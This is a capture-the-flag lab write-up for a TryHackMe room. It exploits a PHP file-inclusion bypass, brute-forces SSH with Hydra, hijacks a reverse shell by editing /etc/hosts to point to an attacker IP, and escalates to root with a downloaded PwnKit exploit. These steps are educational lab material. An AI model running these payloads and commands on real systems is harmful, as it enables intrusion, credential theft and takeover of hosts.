# Scenario

The match has started, and Red has taken the lead on you.
But you are Blue, and only you can take Red down.

However, Red has implemented some defense mechanisms that will make the battle a bit difficult:

1. Red has been known to kick adversaries out of the machine. Is there a way around it?
2. Red likes to change adversaries' passwords but tends to keep them relatively the same.
3. Red likes to taunt adversaries in order to throw off their focus. Keep your mind sharp!

This is a unique battle, and if you feel up to the challenge. Then by all means go for it!

Whenever you are ready, click on the `Start Machine` button to fire up the Virtual Machine.

# Enumeration

## \[+] 10.10.134.206 - red.thm

Using `echo` and `>>` to append the IP address with the domain name to my `/etc/hosts` file. Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online:

```sh
sudo echo '10.10.134.206 red.thm' >> /etc/hosts
export RHOSTS=10.10.134.206
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 80 - HTTP

### \[-] red.thm

There's not much here at first, but if we look at the URL after the page has loaded, the page has redirected to `http://red.thm/index.php?page=home.html`

![a1533f59bcc992caac1dba2743cb485b.png](/resources/67c73225a0334eb38e44ddf40c402e1a.png)

Let's see if the `?page=` parameter is vulnerable to an [LFI attack](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion). For this task I will use [ZAP](https://www.zaproxy.org/)'s Fuzzing tool.

In ZAP, under the "Quick Start" tab, type "`http://red.thm`" into the "URL to Explore field", select your preferred browser and click the "Launch Browser" button:

![19440a9904d3f201403cbe4ab3eb2a3f.png](/resources/a8643c975cb24e8189bce3112632939a.png)

After the page has loaded, we can check the "History" tab towards the bottom and right-click on the entry with the URL `http://red.thm/index.php?page=home.html` then click "Attack", then "Fuzz":

![9071a79680d65779b4d849150d0187a5.png](/resources/3697762bc10d4f528abe1973afd695e0.png)

In the "Fuzzer" window, highlight `home.html` then click "Add...":

![11e7f66a1f895dc241d7b3a1ea2e12f3.png](/resources/4968549e58a146dbbca744fc2c58fab3.png)

In the "Payloads" window, click "Add...":

![1bbbf875e64ec7634f92065aeb274ddc.png](/resources/83c7589f18624a419b8a6b89ee9acac4.png)

Then click the drop down list for "Type", click "File", then click "Select" and select a list that tests for LFI. I used JHaddix's LFI wordlist from the [SecLists GitHub](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt).

After you've selected a wordlist, click "Add", then click "OK" on the Payloads window, and "Start Fuzzer" in the Fuzzer window. When the fuzzing tool starts to run, there will be a new "Fuzzer" tab in the bottom section of ZAP. Click on the "Size Resp. Body" column and sort it from highest to lowest values:

![50312f040151729d3b7227bc8346e6c8.png](/resources/7eba5d5eabb448ea9e0836213991c8a4.png)

Let the fuzzer run for a while and the list should populate. The Payloads with a Size Resp. Body value over 0 bytes are pages that exist and we can access.

After some time, we should see a hit for the payload `index.php` which has a Size Resp. Body of 228 bytes. Clicking on this entry, then checking the "Response" tab at the top shows us the source code for `index.php`:

![446f242593bc6a1d7a7a26dd0daed489.png](/resources/a9e141e6d6db4f5ca8212b79626c5a74.png)

This portion of the code is sanitizing `./` and `../` strings which are commonly used to move up directories within the file system:

```php
function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
```

The next portion of the code only allows the first character to be a letter from `a` to `z`:

```php
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
```

Since common LFI attacks are being sanitized, let's try to read files using the PHP protocol instead. From [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers-and-protocols), we can try using `php://filter/resource=file:///etc/passwd` to access the `/etc/passwd` file. This meets the requirements of the sanitization filter because there are no strings that match (i.e. `./` or `../`) and the first character starts with a letter from `a` to `z`.

The full URL should look like this: `http://red.thm/index.php?page=php://filter/resource=file:///etc/passwd`. After the page loads we should be able to access the `/etc/passwd` file:

![a47e14f8afedc789f19cfc8a8bd2b74f.png](/resources/717245e658cc4e2183628f708f976dc5.png)

Now we have some accounts to explore using the LFI attack we discovered. Let's start with the user `blue` and using the Fuzzer tool again with [this common wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt), we'll try to brute force the files in `blue`'s home directory. The Fuzzer should look like this:

![71178c8c4a2ceb6a8a628bf5376c6fd7.png](/resources/ca3cebce65364f5aac89104c30034563.png)

After some time, we should get a hit on the payload "`.bash_history`" which has a Size Resp. Body of 166 bytes:

![cdeee1d2b065da0146cd1947adec1363.png](/resources/03e50d2eaf914f0caf82c62199cb8ff3.png)

From the Response tab we are able to read the bash command history for the user `blue`. The tool `hashcat` was ran with the flag `--stdout` which will print the output to a hidden file named `.reminder`. This tool uses a rule set to create a password list named `passlist.txt` then they deleted the list using `rm passlist.txt` and removed Hashcat using `sudo apt-get remove hashcat -y`:

```sh
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```

Let's access the `.reminder` file using the LFI attack from earlier. The full URL is: `http://red.thm/index.php?page=php://filter/resource=file:///home/blue/.reminder` which will reveal the contents of the hidden file.

We can then echo the contents from the hidden file to a new file on our attacking machine: `echo "sup3r_p@s\$w0rd\!" > pass.txt` then run the Hashcat tool with the same ruleset used to create permutations of the password: `hashcat --stdout pass.txt -r /usr/share/hashcat/rules/best64.rule > passlist.txt`.

# Initial Access

## Port 22 - SSH

### \[+] blue\@red

After generating the password list, we can use Hydra to bruteforce the SSH login: `hydra -l blue -P passlist.txt ssh://$RHOSTS` the flag `-l` is where we enter the user name `blue`, the flag `-P` specifies we want to use the password list `passlist.txt` and `ssh://` is the protocol we want to attack, and `$RHOSTS` is the environment variable we set at the beginning which holds the IP of the victim machine.

Shortly after running Hydra, we should get the credentials to log into SSH:

![25f7f758adb838d6e09c670cfb568df9.png](/resources/353545511f07486c99fd59c9921c8bc1.png)

Now we can connect to the victim machine via SSH: `ssh blue@$RHOSTS` then enter the password that Hydra found when prompted.

We will find the first flag using the command: `cat /home/blue/flag1` but shortly after, we begin seeing warning messages from the user `red`:

![b7bf23cb441ccaed7f44016fb6e667e6.png](/resources/9723afb34a694c88914ab0b4d73cf6c0.png)

Then we are disconnected and the password has been changed, so we'll have to bruteforce it again using: `hydra -l blue -P passlist.txt ssh://$RHOSTS`.

This time, when connecting via SSH, we will add the `-T` flag which will stop the terminal from getting terminated (more information [here](https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-koth/README.md#general-tips-and-tricks)).

# Privilege Escalation

### \[-] red\@red

After some enumeration, we find an interesting entry in the `/etc/hosts` file using: `cat /etc/hosts`:

![fa20a5a7756e1afe267b6bdb414810b4.png](/resources/da0f3c14efee497183db1c7cbe2966a0.png)

Running `ps aux` reveals the next part of the puzzle:

![208302caf9a4ece71ee5465b9c11e9d7.png](/resources/96a4445f7de34abbaa330f044d0479b7.png)

The user `red` is running the command:

`bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &`

Which is a reverse shell that is connecting to `redrules.thm` on port `9001`. The IP address for `redrules.thm` was specified as `192.168.0.1` in the `/etc/hosts` file.

Let's check if we can write to `/etc/hosts` using the command: `ls -lah /etc/hosts`:

![4df412ac392ce528aae48be44fc1b71b.png](/resources/995a0f384a0942bcbff878e1d877733f.png)

We have permissions to write, so let's add our attacking machine's IP address to `redrules.thm` so when the user `red` runs the reverse shell command again, it will connect to our listener instead.

Using the command `echo "<ATTACKER_IP> redrules.thm" >> /etc/hosts` will append our entry to the end of the file.

Now we will open a new terminal and start a [Netcat](https://linux.die.net/man/1/nc) listener on port 9001 using the command: `nc -nvlp 9001`.

After a short while we should receive a connection from `red`. We can get the next flag using `cat /home/red/flag2`:

![68ba23ddeb26319bb87753ddf598cb1f.png](/resources/6039f99e94a44b4387d9c943b628c5a4.png)

### \[-] root\@red

Inside `/home/red` there is a hidden directory named "`.git`" which has a binary named `pkexec`:

![2614ce6036b17210301ee374f059681f.png](/resources/d06d2ce4d124412f96453d34d1fdb019.png)

It has the SUID bit set and we are able to execute it. [pkexec](https://linux.die.net/man/1/pkexec) is a [Policy Kit](https://linux.die.net/man/8/polkit) tool that allows a user to execute a program as another user.

First, let's check the version of `pkexec` by running `./pkexec --version`:

![80fe9bdf78ffeb4ed71c407213f20069.png](/resources/348faf691b314ef38ae20688957f0b70.png)

If we search for "pkexec 0.105" we will find that this version is vulnerable to the "PwnKit" exploit. There is also a [PwnKit room](https://tryhackme.com/r/room/pwnkit) on TryHackMe. I tried the exploit from that room, but I wasn't able to get it to work. Instead I used a Python variation of the PwnKit exploit by [Ahmad Almorabea](https://github.com/Almorabea/pkexec-exploit).

Before copying the exploit to the victim machine, we need to edit line 103 to point to the directory where `pkexec` is, which is `/home/red/.git/pkexec`.

Save the script, then start a Python HTTP server to host the exploit script using `python3 -m http.server 8080`.

Back on the victim machine, we download the exploit using `wget http://<ATTACKER_IP>:8080/CVE-2021-4034.py`.

When the script has been downloaded, we run it using `python3 CVE-2021-4034.py` then select `n` when prompted and we will have a root shell:

![c79218324d7ec1592a2b816e1a83ca3c.png](/resources/0731ec5a9f4b45b7bde431580cf5085d.png)

Finally, we can get the last flag by using the command `cat /root/flag3`:

![3e9e08c302bd0a0b2fcede8d68bc7a28.png](/resources/cd2e02a753c64802935c5ec94c55ad6c.png)
